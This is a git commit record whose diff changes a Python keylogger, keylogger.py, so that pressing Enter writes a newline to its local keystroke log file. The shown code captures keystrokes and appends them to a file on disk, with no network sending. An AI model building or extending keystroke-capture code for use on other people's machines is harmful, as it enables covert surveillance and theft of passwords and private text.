ca8e9d494e5cf2f7a9d2a82742ce5d697a12efff
Arvind Singh Rajpurohit <arvindsingh7567517479@gmail.com>
2025-07-23 17:22:31 +0530

    Update keylogger.py
    Now when press enter key new line will be printed .

--- keylogger.py
+++ keylogger.py
@@ -6,6 +6,8 @@ def write_to_file(keey):
         letter =' '
     if letter =='Key.shift':
         letter= ''
+    if letter =='Key.enter':
+        letter ="\n"
     with open("D:\LANGUAGE\Python\Project\KeyLogger\log.txt","a") as f:
         f.write(letter)
         if keey ==Key.esc:
